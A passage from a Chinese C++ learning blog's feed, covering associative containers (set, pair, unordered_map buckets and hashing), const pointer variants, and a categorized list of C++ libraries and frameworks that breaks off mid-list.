class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set&lt;string&gt; a;  <span class="comment">//empty set</span></span><br><span class="line">a.<span class="built_in">insert</span>(<span class="string">&quot;fengxin&quot;</span>);  <span class="comment">// 插入一个元素</span></span><br><span class="line">a.<span class="built_in">emplace</span>(<span class="string">&quot;123&quot;</span>);   <span class="comment">//插入</span></span><br><span class="line">a.<span class="built_in">erase</span>(<span class="string">&quot;123&quot;</span>);    <span class="comment">//删除关键字为123的元素</span></span><br></pre></td></tr></table></figure><h5 id="遍历元素"><a href="#遍历元素" class="headerlink" title="遍历元素"></a><strong>遍历元素</strong></h5><p>同map容器类似。我们使用迭代器进行遍历set容器。需要注意的是，同不能改变一个map的关键字一样，一个set中的关键字也是const的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">int</span>&gt; iset=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">auto</span> it=iset.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">if</span>(it!=iset.<span class="built_in">end</span>())</span><br><span class="line">&#123;</span><br><span class="line">     *it=<span class="number">10</span>;  <span class="comment">//错误：set中关键字是只读的</span></span><br><span class="line">     cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="查找"><a href="#查找" class="headerlink" title="查找"></a><strong>查找</strong></h5><p>由于set中存储的只有关键字，所以set容器并不支持下标操作。<br>set同样可以使用find函数进行对关键字的查找，此时函数返回指向关键字的迭代器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">int</span>&gt; iset=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">auto</span> it=iset.<span class="built_in">find</span>(<span class="number">6</span>);</span><br><span class="line">cout&lt;&lt;*it&lt;endl;</span><br></pre></td></tr></table></figure><hr><h5 id="优缺点和适用场景-1"><a href="#优缺点和适用场景-1" class="headerlink" title="优缺点和适用场景"></a><strong>优缺点和适用场景</strong></h5><p>优点：使用红黑树实现，便于元素查找，且保持了元素的唯一性，以及能自动排序。<br>缺点：每次插入值的时候，都需要调整红黑树，效率有一定影响。<br>适用场景：适用于经常查找一个元素是否在某群集中且需要排序的场景。</p><hr><h4 id="严格弱序"><a href="#严格弱序" class="headerlink" title="严格弱序"></a>严格弱序</h4><p><a href="https://blog.csdn.net/River_Lethe/article/details/78618788">C++ 严格弱序</a></p><p><a href="https://blog.csdn.net/qq_34801642/article/details/105726245?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">C++ Primer：可以将严格弱序看作“小于等于”？</a></p><hr><h4 id="关联容器之pair"><a href="#关联容器之pair" class="headerlink" title="关联容器之pair"></a>关联容器之pair</h4><h5 id="pair定义"><a href="#pair定义" class="headerlink" title="pair定义"></a><strong>pair定义</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;T1, T2&gt; p1;            <span class="comment">//创建一个空的pair对象（使用默认构造），它的两个元素分别是T1和T2类型，采用值初始化。</span></span><br><span class="line">pair&lt;T1, T2&gt; p1(v1, v2);    //创建一个pair对象，它的两个元素分别是T1和T2类型，first成员初始化为v1，second成员初始化v2。</span><br><span class="line"><span class="built_in">make_pair</span>(v1, v2);          <span class="comment">// 以v1和v2的值创建一个新的pair对象，其元素类型分别是v1和v2的类型。</span></span><br><span class="line">p1 &lt; p2;                    <span class="comment">// 两个pair对象间的小于运算，其定义遵循字典次序：如 p1.first &lt; p2.first 或者 !(p2.first &lt; p1.first) &amp;&amp; (p1.second &lt; p2.second) 则返回true。</span></span><br><span class="line">p1 == p2；                  <span class="comment">// 如果两个对象的first和second依次相等，则这两个对象相等；该运算使用元素的==操作符。</span></span><br><span class="line">p1.first;                   <span class="comment">// 返回对象p1中名为first的公有数据成员</span></span><br><span class="line">p1.second;                 <span class="comment">// 返回对象p1中名为second的公有数据成员</span></span><br><span class="line">p1 relop p2                <span class="comment">// </span></span><br><span class="line">p1 == p2</span><br><span class="line">p1 != p2 </span><br></pre></td></tr></table></figure><h5 id="关联容器操作"><a href="#关联容器操作" class="headerlink" title="关联容器操作"></a><strong>关联容器操作</strong></h5><p><img src="/img/cplusplus/relation-types.png" alt="img"></p><hr><h4 id="无序关联容器"><a href="#无序关联容器" class="headerlink" title="无序关联容器"></a><strong>无序关联容器</strong></h4><p>有序关联容器中的关键字是有序排列的，所以要求关键字可以进行&lt;运算符比较或满足自定义的比较操作。无序关联容器不是使用比较运算符来组织元素，而是使用一个哈希函数和关键字类型的==运算符。</p><p>无序容器可以使用上述所有的与有序容器相同的操作，由于无序容器在存储上组织为桶，每个桶保存零个或多个元素，容器的性能依赖于哈希函数的质量和桶的数量和大小，因此无序容器多了一些哈希函数和桶相关的操作。</p><h5 id="桶操作"><a href="#桶操作" class="headerlink" title="桶操作"></a>桶操作</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="built_in">bucket_count</span>()        正在使用的桶的数目</span><br><span class="line">m.<span class="built_in">max_bucket_count</span>()    容器能容纳的最多的桶的数量</span><br><span class="line">m.<span class="built_in">bucket_size</span>(n)        第n个桶中有多少个元素</span><br><span class="line">m.<span class="built_in">bucket</span>(k)             关键字为k的元素在哪个桶</span><br></pre></td></tr></table></figure><h5 id="桶迭代"><a href="#桶迭代" class="headerlink" title="桶迭代"></a>桶迭代</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">local_iterator            可以用来访问桶中元素的迭代器类型</span><br><span class="line">const_local_iterator      桶迭代器的<span class="keyword">const</span>版本</span><br><span class="line">m.<span class="built_in">begin</span>(n)、m.<span class="built_in">end</span>(n)      桶n的首元素迭代器和尾后迭代器（n是什么类型？）</span><br><span class="line">m.<span class="built_in">cbegin</span>(n)、m.<span class="built_in">cend</span>(n)    与前两个函数类似，但返回const_local_iterator</span><br></pre></td></tr></table></figure><h5 id="哈希策略"><a href="#哈希策略" class="headerlink" title="哈希策略"></a>哈希策略</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//每个桶的平均元素数量，返回float值</span></span><br><span class="line">m.<span class="built_in">load_factor</span>() </span><br><span class="line"><span class="comment">//m试图维护的平均桶大小，返回float值，要求创建的新桶的load_factor&lt;=max_load_factor         </span></span><br><span class="line">m.<span class="built_in">max_load_factor</span>() </span><br><span class="line"><span class="comment">//重新存储，使得bucket_count&gt;=n，且bucket_count&gt;size/max_load_factor         </span></span><br><span class="line">m.<span class="built_in">rehash</span>(n)  </span><br><span class="line"><span class="comment">//重新存储，使得m可以保存n个元素且不必rehash </span></span><br><span class="line">m.<span class="built_in">reserve</span>(n) </span><br></pre></td></tr></table></figure><p>自定义类型</p><p>内置类型包括指针可以直接定义hash，因此可以直接定义内置类型的无需容器，但是不能直接定义自定义类类型的无需容器，需要自定义hash模板。</p><p><img src="https://images2018.cnblogs.com/blog/1272978/201806/1272978-20180610192953109-57405861.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> unordered_map&lt;string, <span class="keyword">double</span>&gt;::iterator MyIte;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">test_unordered_map</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"> </span>&#123; </span><br><span class="line">     unordered_map&lt;string, <span class="keyword">double</span>&gt; umap;</span><br><span class="line">     umap.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;苹果&quot;</span>, <span class="number">2.5</span>));</span><br><span class="line">     umap.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;香蕉&quot;</span>, <span class="number">3.0</span>));</span><br><span class="line">     umap.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;香蕉&quot;</span>, <span class="number">3.0</span>));</span><br><span class="line">     umap.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;西瓜&quot;</span>, <span class="number">1.5</span>));</span><br><span class="line">     umap.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;哈密瓜&quot;</span>, <span class="number">3.0</span>));</span><br><span class="line">     umap[<span class="string">&quot;榴莲&quot;</span>] = <span class="number">4.0</span>;</span><br><span class="line">     MyIte it = umap.<span class="built_in">begin</span>( );</span><br><span class="line">     <span class="keyword">while</span>( it != umap.<span class="built_in">end</span>( ))</span><br><span class="line">     &#123; </span><br><span class="line">         cout&lt;&lt;it-&gt;first&lt;&lt;<span class="string">&quot; :&quot;</span>&lt;&lt;it-&gt;second&lt;&lt;endl;</span><br><span class="line">         ++it;</span><br><span class="line">     &#125;   </span><br><span class="line">     cout&lt;&lt;<span class="string">&quot;桶数量：&quot;</span>&lt;&lt;umap.<span class="built_in">bucket_count</span>( )&lt;&lt;endl;</span><br><span class="line">     cout&lt;&lt;<span class="string">&quot;负载因子：&quot;</span>&lt;&lt;umap.<span class="built_in">load_factor</span>( )&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//结果：</span></span><br><span class="line">    <span class="comment">//榴莲 :4</span></span><br><span class="line">    <span class="comment">//苹果 :2.5</span></span><br><span class="line">    <span class="comment">//哈密瓜 :3</span></span><br><span class="line">    <span class="comment">//香蕉 :3</span></span><br><span class="line">    <span class="comment">//西瓜 :1.5</span></span><br><span class="line">    <span class="comment">//桶数量：11</span></span><br><span class="line">    <span class="comment">//负载因子：0.454545</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h4><p>1、vector封装数组，list封装了链表，set, multiset, map, multimap内部采用的就是一种非常高效的平衡检索二叉树：红黑树。</p><p>2、<code>std::map</code>/<code>std::set</code>均为有序容器，这些元素内部通过红黑树进行实现， 插入和搜索的平均复杂度均为<code>O(log(size))</code>。在插入元素时候，会根据<code>&lt;</code>操作符比较元素大小并判断元素是否相同， 并选择合适的位置插入到容器中。当对这个容器中的元素进行遍历时，输出结果会按照<code>&lt;</code>操作符的顺序来逐个遍历。</p><p>空间占用率高，因为map内部实现了红黑树，虽然提高了运行效率，但是因为每一个节点都需要额外保存父节点，孩子节点以及红/黑性质，使得每一个节点都占用大量的空间，对于那些有顺序要求的问题，用map会更高效一些。</p><p>map、set中查找是使用二分查找，对速度影响分析</p><p>insert、erase之后，已保存的iterator失效问题。</p><p>3、unordered_map 因为内部实现了哈希表，因此其查找速度非常的快，但是哈希表的建立比较耗费时间对于查找问题，unordered_map会更加高效一些，因此遇到查找问题，常会考虑一下用unordered_map</p><h4 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h4><p><a href="https://lennon.work/2021/06/15/cplusplus/%E4%B8%A5%E6%A0%BC%E5%BC%B1%E5%BA%8F%E4%B8%8Emultiset%E6%B5%8B%E8%AF%95/">严格弱序与multiset测试</a></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://zhuanlan.zhihu.com/p/158647883">基础篇：STL容器和算法</a></p><p><a href="https://blog.csdn.net/fengxinlinux/article/details/73718859">c++关联容器总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;关联容器&quot;&gt;&lt;a href=&quot;#关联容器&quot; class=&quot;headerlink&quot; title=&quot;关联容器&quot;&gt;&lt;/a&gt;关联容器&lt;/h3&gt;&lt;p&gt;容器分为顺序容器和关联容器，他们之间存在根本的区别，联容器中的元素是按关键字来保存和访问的。与之相对，顺序容器中的元素是按它</summary>
      
    
    
    
    <category term="C++" scheme="https://lennon.work/categories/C/"/>
    
    
    <category term="基础知识" scheme="https://lennon.work/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    <category term="概念必备" scheme="https://lennon.work/tags/%E6%A6%82%E5%BF%B5%E5%BF%85%E5%A4%87/"/>
    
    <category term="c++" scheme="https://lennon.work/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>C++学习 小贴士（一）</title>
    <link href="https://lennon.work/2021/04/22/cplusplus/constchar/"/>
    <id>https://lennon.work/2021/04/22/cplusplus/constchar/</id>
    <published>2021-04-22T10:55:52.854Z</published>
    <updated>2021-06-15T08:22:08.506Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-学习-小贴士（一）"><a href="#C-学习-小贴士（一）" class="headerlink" title="C++学习 小贴士（一）"></a>C++学习 小贴士（一）</h1><h2 id="const-char-p-amp-char-const-p-amp-const-char-const-p"><a href="#const-char-p-amp-char-const-p-amp-const-char-const-p" class="headerlink" title="const char* p &amp;  char* const p &amp; const char* const p"></a>const char* p &amp;  char* const p &amp; const char* const p</h2><p>最近学习c++中遇到一些小知识，没啥知识点，就是需要记住。</p><h4 id="const-char-p"><a href="#const-char-p" class="headerlink" title="const char* p"></a>const char* p</h4><p>解释 读作 non-const ponit 修饰 const value</p><p>因此不能通过指针修改value，可以修改 p本身。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> a = <span class="string">&#x27;A&#x27;</span>, b = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* ptr = &amp;a;</span><br><span class="line">    <span class="comment">//*ptr = b; ierror</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    ptr = &amp;b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    <span class="comment">// ptr can be changed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="char-const-p"><a href="#char-const-p" class="headerlink" title="char* const p"></a>char* const p</h4><p>解释 读作 const ponit 修饰 non-const value</p><p>可以通过指针修改value吗，但是不能修改指针本身。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a = <span class="string">&#x27;A&#x27;</span>, b = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span>* <span class="keyword">const</span> ptr = &amp;a;</span><br><span class="line">    <span class="comment">//ptr = &amp;b; error</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    *ptr = b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    <span class="comment">// value can be changed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="const-char-const-p"><a href="#const-char-const-p" class="headerlink" title="const char* const p"></a>const char* const p</h4><p>解释 读作 const ponit 修饰 const value</p><p>顾名思义 point 和value 都加上了 const修饰，因此指针和值都不能修改。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a = <span class="string">&#x27;A&#x27;</span>, b = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span>* <span class="keyword">const</span> ptr = &amp;a;</span><br><span class="line">    <span class="comment">//ptr = &amp;b; error</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    <span class="comment">//*ptr = b; error</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value pointed to by ptr: %c\n&quot;</span>, *ptr);</span><br><span class="line">    <span class="comment">// value can be changed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考来源：<a href="https://www.geeksforgeeks.org/difference-const-char-p-char-const-p-const-char-const-p/">https://www.geeksforgeeks.org/difference-const-char-p-char-const-p-const-char-const-p/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C-学习-小贴士（一）&quot;&gt;&lt;a href=&quot;#C-学习-小贴士（一）&quot; class=&quot;headerlink&quot; title=&quot;C++学习 小贴士（一）&quot;&gt;&lt;/a&gt;C++学习 小贴士（一）&lt;/h1&gt;&lt;h2 id=&quot;const-char-p-amp-char-const</summary>
      
    
    
    
    <category term="C++" scheme="https://lennon.work/categories/C/"/>
    
    
    <category term="基础知识" scheme="https://lennon.work/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    <category term="概念必备" scheme="https://lennon.work/tags/%E6%A6%82%E5%BF%B5%E5%BF%85%E5%A4%87/"/>
    
    <category term="c++" scheme="https://lennon.work/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>C++标准库及框架自学收藏</title>
    <link href="https://lennon.work/2021/04/18/cplusplus/resource/"/>
    <id>https://lennon.work/2021/04/18/cplusplus/resource/</id>
    <published>2021-04-18T13:10:07.974Z</published>
    <updated>2021-04-22T11:13:31.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="C-标准库及框架自学收藏"><a href="#C-标准库及框架自学收藏" class="headerlink" title="C++标准库及框架自学收藏"></a>C++标准库及框架自学收藏</h2><hr><p>标准库</p><p>C++标准库，包括了STL容器，算法和函数等。</p><ul><li>C++ Standard Library：是一系列类和函数的集合，使用核心语言编写，也是C++ISO自身标准的一部分。</li><li>Standard Template Library：标准模板库</li><li>C POSIX library ： POSIX系统的C标准库规范</li><li>ISO C++ Standards Committee ：C++标准委员会</li></ul><p>框架</p><p>C++通用框架和库</p><ul><li>Apache C++ Standard Library：是一系列算法，容器，迭代器和其他基本组件的集合</li><li>ASL ：Adobe源代码库提供了同行的评审和可移植的C++源代码库。</li><li>Boost ：大量通用C++库的集合。</li><li>BDE ：来自于彭博资讯实验室的开发环境。</li><li>Cinder：提供专业品质创造性编码的开源开发社区。</li><li>Cxxomfort：轻量级的，只包含头文件的库，将C++ 11的一些新特性移植到C++03中。</li><li>Dlib：使用契约式编程和现代C++科技设计的通用的跨平台的C++库。</li><li>EASTL ：EA-STL公共部分</li><li>ffead-cpp ：企业应用程序开发框架</li><li>Folly：由Facebook开发和使用的开源C++库</li><li>JUCE ：包罗万象的C++类库，用于开发跨平台软件</li><li>libPhenom：用于构建高性能和高度可扩展性系统的事件框架。</li><li>LibSourcey ：用于实时的视频流和高性能网络应用程序的C++11 evented IO</li><li>LibU ： C语言写的多平台工具库</li><li>Loki ：C++库的设计，包括常见的设计模式和习语的实现。</li><li>MiLi ：只含头文件的小型C++库</li><li>openFrameworks ：开发C++工具包，用于创意性编码。</li><li>Qt ：跨平台的应用程序和用户界面框架</li><li>Reason ：跨平台的框架，使开发者能够更容易地使用Java，.Net和Python，同时也满足了他们对C++性能和优势的需求。</li><li>ROOT ：具备所有功能的一系列面向对象的框架，能够非常高效地处理和分析大量的数据，为欧洲原子能研究机构所用。</li><li>STLport：是STL具有代表性的版本</li><li>STXXL：用于额外的大型数据集的标准模板库。</li><li>Ultimate++ ：C++跨平台快速应用程序开发框架</li><li>Windows Template Library：用于开发Windows应用程序和UI组件的C++库</li><li>Yomm11 ：C++11的开放multi-methods.</li></ul><p>人工智能</p><ul><li>btsk ：游戏行为树启动器工具</li><li>Evolving Objects：基于模板的，ANSI C++演化计算库，能够帮助你非常快速地编写出自己的随机优化算法。</li><li>Neu：C++11框架，编程语言集，用于创建人工智能应用程序的多用途软件系统。</li></ul><p>异步事件循环</p><ul><li>Boost.Asio：用于网络和底层I/O编程的跨平台的C++库。</li><li>libev ：功能齐全，高性能的时间循环，轻微地仿效libevent，但是不再像libevent一样有局限性，也修复了它的一些bug。</li><li>libevent ：事件通知库</li><li>libuv ：跨平台异步I/O。</li></ul><p>音频</p><p>音频，声音，音乐，数字化音乐库</p><ul><li>FMOD ：易于使用的跨平台的音频引擎和音频内容的游戏创作工具。</li><li>Maximilian ：C++音频和音乐数字信号处理库</li><li>OpenAL ：开源音频库—跨平台的音频API</li><li>Opus：一个完全开放的，免版税的，高度通用的音频编解码器</li><li>Speex：免费编解码器，为Opus所废弃</li><li>Tonic： C++易用和高效的音频合成</li><li>Vorbis： Ogg Vorbis是一种完全开放的，非专有的，免版税的通用压缩音频格式。</li></ul><p>生态学</p><p>生物信息，基因组学和生物技术</p><ul><li>libsequence：用于表示和分析群体遗传学数据的C++库。</li><li>SeqAn：专注于生物数据序列分析的算法和数据结构。</li><li>Vcflib ：用于解析和处理VCF文件的C++库</li><li>Wham：直接把联想测试应用到BAM文件的基因结构变异。</li></ul><p>压缩</p><p>压缩和归档库</p><ul><li>bzip2：一个完全免费，免费专利和高质量的数据压缩</li><li>doboz：能够快速解压缩的压缩库</li><li>PhysicsFS：对各种归档提供抽象访问的库，主要用于视频游戏，设计灵感部分来自于Quake3的文件子系统。</li><li>KArchive：用于创建，读写和操作文件档案（例如zip和 tar）的库，它通过QIODevice的一系列子类，使用gzip格式，提供了透明的压缩和解压缩的数据。</li><li>LZ4 ：非常快速的压缩算法</li><li>LZHAM ：无损压缩数据库，压缩比率跟LZMA接近，但是解压缩速度却要快得多。</li><li>LZMA ：7z格式默认和通用的压缩方法。</li><li>LZMAT ：及其快速的实时无损数据压缩库</li><li>miniz：单一的C源文件，紧缩/膨胀压缩库，使用zlib兼容API，ZIP归档读写，PNG写方式。</li><li>Minizip：Zlib最新bug修复，支持PKWARE磁盘跨越，AES加密和IO缓冲。</li><li>Snappy ：快速压缩和解压缩</li><li>ZLib ：非常紧凑的数据流压缩库</li><li>ZZIPlib：提供ZIP归档的读权限。</li></ul><p>并发性</p><p>并发执行和多线程</p><ul><li>Boost.Compute ：用于OpenCL的C++GPU计算库</li><li>Bolt ：针对GPU进行优化的C++模板库</li><li>C++React ：用于C++11的反应性编程库</li><li>Intel TBB ：Intel线程构件块</li><li>Libclsph：基于OpenCL的GPU加速SPH流体仿真库</li><li>OpenCL ：并行编程的异构系统的开放标准</li><li>OpenMP：OpenMP API</li><li>Thrust ：类似于C++标准模板库的并行算法库</li><li>HPX ：用于任何规模的并行和分布式应用程序的通用C++运行时系统</li><li>VexCL ：用于OpenCL/CUDA 的C++向量表达式模板库。</li></ul><p>容器</p><ul><li>C++ B-tree ：基于B树数据结构，实现命令内存容器的模板库</li><li>Hashmaps： C++中开放寻址哈希表算法的实现</li></ul><p>密码学</p><ul><li>Bcrypt ：一个跨平台的文件加密工具，加密文件可以移植到所有可支持的操作系统和处理器中。</li><li>BeeCrypt：</li><li>Botan： C++加密库</li><li>Crypto++：一个有关加密方案的免费的C++库</li><li>GnuPG： OpenPGP标准的完整实现</li><li>GnuTLS ：实现了SSL，TLS和DTLS协议的安全通信库</li><li>Libgcrypt</li><li>libmcrypt</li><li>LibreSSL：免费的SSL/TLS协议，属于2014 OpenSSL的一个分支</li><li>LibTomCrypt：一个非常全面的，模块化的，可移植的加密工具</li><li>libsodium：基于NaCI的加密库，固执己见，容易使用</li><li>Nettle 底层的加密库</li><li>OpenSSL ： 一个强大的，商用的，功能齐全的，开放源代码的加密库。</li><li>Tiny AES128 in C ：用C实现的一个小巧，可移植的实现了AES128ESB的加密算法</li></ul><p>数据库</p><p>数据库，SQL服务器，ODBC驱动程序和工具</p><ul><li>hiberlite ：用于Sqlite3的C++对象关系映射</li><li>Hiredis： 用于Redis数据库的很简单的C客户端库</li><li>LevelDB： 快速键值存储库</li><li>LMDB：符合数据库四大基本元素的嵌入键值存储</li><li>MySQL++：封装了MySql的C API的C++ 包装器</li><li>RocksDB：来自Facebook的嵌入键值的快速存储</li><li>SQLite：一个完全嵌入式的，功能齐全的关系数据库，只有几百KB，可以正确包含到你的项目中。</li></ul><p>调试</p><p>调试库， 内存和资源泄露检测，单元测试</p><ul><li>Boost.Test：Boost测试库</li><li>Catch：一个很时尚的，C++原生的框架，只包含头文件，用于单元测试，测试驱动开发和行为驱动开发。</li><li>CppUnit：由JUnit移植过来的C++测试框架</li><li>CTest：CMake测试驱动程序</li><li>googletest：谷歌C++测试框架</li><li>ig-debugheap：用于跟踪内存错误的多平台调试堆</li><li>libtap：用C语言编写测试</li><li>MemTrack —用于C++跟踪内存分配</li><li>microprofile- 跨平台的网络试图分析器</li><li>minUnit ：使用C写的迷你单元测试框架，只使用了两个宏</li><li>Remotery：用于web视图的单一C文件分析器</li><li>UnitTest++：轻量级的C++单元测试框架</li></ul><p>游戏引擎</p><ul><li>Cocos2d-x ：一个跨平台框架，用于构建2D游戏，互动图书，演示和其他图形应用程序。</li><li>Grit ：社区项目，用于构建一个免费的游戏引擎，实现开放的世界3D游戏。</li><li>Irrlicht ：C++语言编写的开源高性能的实时#D引擎</li><li>Polycode：C++实现的用于创建游戏的开源框架（与Lua绑定）。</li></ul><p>图形用户界面</p><ul><li>CEGUI ： 很灵活的跨平台GUI库</li><li>FLTK ：快速，轻量级的跨平台的C++GUI工具包。</li><li>GTK+： 用于创建图形用户界面的跨平台工具包</li><li>gtkmm ：用于受欢迎的GUI库GTK+的官方C++接口。</li><li>imgui：拥有最小依赖关系的立即模式图形用户界面</li><li>libRocket ：libRocket 是一个C++ HTML/CSS 游戏接口中间件</li><li>MyGUI ：快速，灵活，简单的GUI</li><li>Ncurses：终端用户界面</li><li>QCustomPlot ：没有更多依赖关系的Qt绘图控件</li><li>Qwt ：用户与技术应用的Qt 控件</li><li>QwtPlot3D ：功能丰富的基于Qt/OpenGL的C++编程库，本质上提供了一群3D控件</li><li>OtterUI ：OtterUI 是用于嵌入式系统和互动娱乐软件的用户界面开发解决方案</li><li>PDCurses 包含源代码和预编译库的公共图形函数库</li><li>wxWidgets C++库，允许开发人员使用一个代码库可以为widows， Mac OS X，Linux和其他平台创建应用程序</li></ul><p>图形</p><ul><li>bgfx：跨平台的渲染库</li><li>Cairo：支持多种输出设备的2D图形库</li><li>Horde3D 一个小型的3D渲染和动画引擎</li><li>magnum C++11和OpenGL 2D/3D 图形引擎</li><li>Ogre 3D 用C++编写的一个面向场景，实时，灵活的3D渲染引擎（并非游戏引擎）</li><li>OpenSceneGraph 具有高性能的开源3D图形工具包</li><li>Panda3D 用于3D渲染和游戏开发的框架，用Python和C++编写。</li><li>Skia 用于绘制文字，图形和图像的完整的2D图形库</li><li>urho3d 跨平台的渲染和游戏引擎。</li></ul><p>图像处理</p><ul><li>Boost.GIL：通用图像库</li><li>CImg ：用于图像处理的小型开源C++工具包</li><li>CxImage ：用于加载，保存，显示和转换的图像处理和转换库，可以处理的图片格式包括 BMP, JPEG, GIF, PNG, TIFF, MNG, ICO, PCX, TGA, WMF, WBMP, JBG, J2K。</li><li>FreeImage ：开源库，支持现在多媒体应用所需的通用图片格式和其他格式。</li><li>GDCM：Grassroots DICOM 